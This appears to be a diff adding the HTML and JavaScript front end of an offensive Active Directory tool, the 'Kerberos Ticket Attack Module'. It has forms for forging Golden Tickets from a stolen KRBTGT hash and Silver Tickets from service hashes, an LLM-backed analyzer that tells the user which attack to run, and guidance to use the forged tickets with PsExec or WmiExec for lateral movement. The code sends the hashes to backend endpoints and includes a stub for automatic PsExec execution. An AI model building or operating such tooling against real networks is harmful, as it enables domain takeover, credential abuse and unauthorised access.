@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kerberos Ticket Attack - Golden/Silver Ticket</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            color: #e4e4e4;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        .header {
+            background: linear-gradient(90deg, #e94560, #0f3460);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(233, 69, 96, 0.3);
+        }
+        .header h1 { font-size: 28px; margin-bottom: 5px; }
+        .header p { opacity: 0.8; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 10px;
+            padding: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .card h2 {
+            color: #e94560;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(233,69,96,0.3);
+        }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 5px; color: #aaa; font-size: 14px; }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+        }
+        .form-group input:focus { outline: none; border-color: #e94560; }
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .btn-golden { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #000; }
+        .btn-silver { background: linear-gradient(135deg, #c0c0c0, #808080); color: #000; }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .output {
+            background: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            min-height: 300px;
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        .output-line { margin: 3px 0; }
+        .output-success { color: #00ff00; }
+        .output-error { color: #ff4444; }
+        .output-info { color: #00aaff; }
+        .output-warning { color: #ffaa00; }
+        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab {
+            padding: 10px 20px;
+            background: rgba(255,255,255,0.1);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .tab.active { background: #e94560; }
+        .tab:hover { background: rgba(233,69,96,0.5); }
+        .hidden { display: none; }
+        .hash-input {
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+        }
+        .info-box {
+            background: rgba(233, 69, 96, 0.1);
+            border: 1px solid #e94560;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .info-box h3 { color: #e94560; margin-bottom: 10px; }
+        .info-box ul { margin-left: 20px; }
+        .info-box li { margin: 5px 0; color: #aaa; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎫 Kerberos Ticket Attack Module</h1>
+            <p>Golden Ticket & Silver Ticket Automation with LLM-Powered Hash Detection</p>
+        </div>
+
+        <div class="info-box">
+            <h3>📋 How to Use</h3>
+            <ul>
+                <li><strong>Golden Ticket:</strong> Requires KRBTGT hash to forge TGT for Domain Admin access</li>
+                <li><strong>Silver Ticket:</strong> Requires service account hash for specific service access</li>
+                <li><strong>LLM Detection:</strong> Automatically analyzes if hash is KRBTGT</li>
+                <li><strong>Target:</strong> Use forged ticket with PsExec/WmiExec for lateral movement</li>
+            </ul>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('golden')">🥇 Golden Ticket</button>
+            <button class="tab" onclick="showTab('silver')">🥈 Silver Ticket</button>
+            <button class="tab" onclick="showTab('analyze')">🔍 Hash Analyzer</button>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <!-- Golden Ticket Form -->
+                <div id="golden-form">
+                    <h2>🥇 Forge Golden Ticket</h2>
+                    <div class="form-group">
+                        <label>KRBTGT Hash (user:id:lm:nt format)</label>
+                        <input type="text" id="golden-hash" class="hash-input" 
+                               placeholder="krbtgt:502:aad3b435b51404ee:8846f7ea...">
+                    </div>
+                    <div class="form-group">
+                        <label>Domain</label>
+                        <input type="text" id="golden-domain" placeholder="CORP.LOCAL">
+                    </div>
+                    <div class="form-group">
+                        <label>Domain SID</label>
+                        <input type="text" id="golden-sid" placeholder="S-1-5-21-xxx-xxx-xxx">
+                    </div>
+                    <div class="form-group">
+                        <label>Target User</label>
+                        <input type="text" id="golden-user" value="Administrator">
+                    </div>
+                    <button class="btn btn-golden" onclick="forgeGoldenTicket()">
+                        🎫 Forge Golden Ticket
+                    </button>
+                </div>
+
+                <!-- Silver Ticket Form -->
+                <div id="silver-form" class="hidden">
+                    <h2>🥈 Forge Silver Ticket</h2>
+                    <div class="form-group">
+                        <label>Service Hash (user:id:lm:nt format)</label>
+                        <input type="text" id="silver-hash" class="hash-input" 
+                               placeholder="service:1001:aad3b435b51404ee:nt_hash...">
+                    </div>
+                    <div class="form-group">
+                        <label>Domain</label>
+                        <input type="text" id="silver-domain" placeholder="CORP.LOCAL">
+                    </div>
+                    <div class="form-group">
+                        <label>Service Type</label>
+                        <select id="silver-service">
+                            <option value="cifs">CIFS (SMB/File Share)</option>
+                            <option value="ldap">LDAP (Directory)</option>
+                            <option value="host">HOST (Host Access)</option>
+                            <option value="http">HTTP (Web)</option>
+                            <option value="mssql">MSSQL (SQL Server)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Target Host</label>
+                        <input type="text" id="silver-host" placeholder="DC1">
+                    </div>
+                    <button class="btn btn-silver" onclick="forgeSilverTicket()">
+                        🎫 Forge Silver Ticket
+                    </button>
+                </div>
+
+                <!-- Hash Analyzer Form -->
+                <div id="analyze-form" class="hidden">
+                    <h2>🔍 LLM-Powered Hash Analyzer</h2>
+                    <div class="form-group">
+                        <label>Hash to Analyze</label>
+                        <input type="text" id="analyze-hash" class="hash-input" 
+                               placeholder="Paste any hash here...">
+                    </div>
+                    <div class="form-group">
+                        <label>Additional Context (optional)</label>
+                        <input type="text" id="analyze-context" 
+                               placeholder="e.g., Domain: CORP.LOCAL">
+                    </div>
+                    <button class="btn" style="background: linear-gradient(135deg, #00aaff, #0066ff);" 
+                            onclick="analyzeHash()">
+                        🔍 Analyze Hash
+                    </button>
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>📊 Output & Results</h2>
+                <div class="output" id="output">
+                    <div class="output-line output-info">[*] Kerberos Ticket Module Ready</div>
+                    <div class="output-line output-info">[*] Select a ticket type to begin</div>
+                    <div class="output-line output-info">[*] Requires Impacket ticketer.py</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentTab = 'golden';
+
+        function showTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            document.getElementById('golden-form').classList.add('hidden');
+            document.getElementById('silver-form').classList.add('hidden');
+            document.getElementById('analyze-form').classList.add('hidden');
+            
+            document.getElementById(tab + '-form').classList.remove('hidden');
+        }
+
+        function log(message, type = 'info') {
+            const output = document.getElementById('output');
+            const div = document.createElement('div');
+            div.className = `output-line output-${type}`;
+            div.textContent = message;
+            output.appendChild(div);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function logJSON(data, prefix = '') {
+            const output = document.getElementById('output');
+            const pre = document.createElement('pre');
+            pre.style.cssText = 'color: #888; margin: 5px 0; font-size: 11px;';
+            pre.textContent = prefix + JSON.stringify(data, null, 2);
+            output.appendChild(pre);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        async function forgeGoldenTicket() {
+            const hash = document.getElementById('golden-hash').value.trim();
+            const domain = document.getElementById('golden-domain').value.trim();
+            const sid = document.getElementById('golden-sid').value.trim();
+            const user = document.getElementById('golden-user').value.trim() || 'Administrator';
+
+            if (!hash || !domain) {
+                log('[!] Please fill in hash and domain', 'error');
+                return;
+            }
+
+            log('='.repeat(50));
+            log('[*] Forging Golden Ticket...', 'info');
+            log(`[*] Domain: ${domain}`);
+            log(`[*] User: ${user}`);
+            log(`[*] Hash: ${hash.substring(0, 40)}...`);
+
+            try {
+                const response = await fetch('/api/kerberos/golden', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        hash: hash,
+                        domain: domain,
+                        domain_sid: sid,
+                        target_user: user
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    log('[+] Golden Ticket Forged Successfully!', 'success');
+                    log(`[*] Ticket File: ${data.ticket_file}`, 'info');
+                    log(`[*] Valid Until: ${data.valid_until}`, 'info');
+                    log(`[*] Commands: ${data.commands.join(' && ')}`, 'info');
+                    
+                    if (data.auto_psexec) {
+                        log('[*] Executing with PsExec...', 'info');
+                        // Additional call to execute
+                    }
+                } else {
+                    log(`[!] Failed: ${data.error}`, 'error');
+                }
+            } catch (e) {
+                log(`[!] Error: ${e.message}`, 'error');
+            }
+        }
+
+        async function forgeSilverTicket() {
+            const hash = document.getElementById('silver-hash').value.trim();
+            const domain = document.getElementById('silver-domain').value.trim();
+            const service = document.getElementById('silver-service').value;
+            const host = document.getElementById('silver-host').value.trim();
+
+            if (!hash || !domain || !host) {
+                log('[!] Please fill in all fields', 'error');
+                return;
+            }
+
+            log('='.repeat(50));
+            log('[*] Forging Silver Ticket...', 'info');
+            log(`[*] Domain: ${domain}`);
+            log(`[*] Service: ${service}/${host}`);
+            log(`[*] Hash: ${hash.substring(0, 40)}...`);
+
+            try {
+                const response = await fetch('/api/kerberos/silver', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        hash: hash,
+                        domain: domain,
+                        service: service,
+                        target_host: host
+                    })
+                });
+
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    log('[+] Silver Ticket Forged Successfully!', 'success');
+                    log(`[*] SPN: ${data.spn}`, 'info');
+                    log(`[*] Ticket File: ${data.ticket_file}`, 'info');
+                } else {
+                    log(`[!] Failed: ${data.error}`, 'error');
+                }
+            } catch (e) {
+                log(`[!] Error: ${e.message}`, 'error');
+            }
+        }
+
+        async function analyzeHash() {
+            const hash = document.getElementById('analyze-hash').value.trim();
+            const context = document.getElementById('analyze-context').value.trim();
+
+            if (!hash) {
+                log('[!] Please enter a hash to analyze', 'error');
+                return;
+            }
+
+            log('='.repeat(50));
+            log('[*] Analyzing hash with LLM...', 'info');
+
+            try {
+                const response = await fetch('/api/kerberos/analyze', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        hash: hash,
+                        context: context
+                    })
+                });
+
+                const data = await response.json();
+                
+                log('[+] Analysis Complete:', 'success');
+                logJSON(data, '[*] ');
+                
+                if (data.is_krbtgt) {
+                    log('🎯 KRBTGT hash detected! Use Golden Ticket attack.', 'warning');
+                } else if (data.is_service) {
+                    log('🎯 Service account hash detected! Use Silver Ticket attack.', 'warning');
+                }
+            } catch (e) {
+                log(`[!] Error: ${e.message}`, 'error');
+            }
+        }
+    </script>
+</body>
+</html>
